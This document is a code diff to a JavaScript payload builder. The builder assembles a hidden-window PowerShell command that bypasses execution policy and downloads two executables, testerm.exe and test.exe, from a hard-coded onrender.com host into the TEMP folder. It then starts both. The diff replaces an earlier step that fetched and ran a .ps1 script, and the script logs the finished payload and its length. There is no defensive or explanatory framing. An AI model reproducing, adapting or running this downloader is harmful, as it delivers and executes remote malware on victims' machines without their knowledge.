@@ -263,21 +263,21 @@
 
 const CFG = {
   site:      'kekman-1.onrender.com',
-  ps1_url:   'https://kekman-1.onrender.com/file.ps1',
-  ps1_name:  'file.ps1',
-  exe_url:   'https://kekman-1.onrender.com/test.exe',
-  exe_name:  'test.exe'
+  exe1_url:  'https://kekman-1.onrender.com/testerm.exe',
+  exe1_name: 'testerm.exe',
+  exe2_url:  'https://kekman-1.onrender.com/test.exe',
+  exe2_name: 'test.exe'
 };
 
 // ╚══════════════════════════════════════════════════════════════════╝
 
-// sequential: fetch + run file.ps1 (blocks until done), THEN fetch + start test.exe
+// fetch + launch testerm.exe, then fetch + launch test.exe
 const PAYLOAD =
   'powershell -w h -ExecutionPolicy Bypass -c "' +
-  'iwr ' + CFG.ps1_url + ' -OutFile $env:TEMP\\' + CFG.ps1_name +
-  '; & $env:TEMP\\' + CFG.ps1_name +
-  '; iwr ' + CFG.exe_url + ' -OutFile $env:TEMP\\' + CFG.exe_name +
-  '; start $env:TEMP\\' + CFG.exe_name + '"';
+  'iwr ' + CFG.exe1_url + ' -OutFile $env:TEMP\\' + CFG.exe1_name +
+  '; start $env:TEMP\\' + CFG.exe1_name +
+  '; iwr ' + CFG.exe2_url + ' -OutFile $env:TEMP\\' + CFG.exe2_name +
+  '; start $env:TEMP\\' + CFG.exe2_name + '"';
 
 console.log('[payload]', PAYLOAD);
 console.log('[length]', PAYLOAD.length);
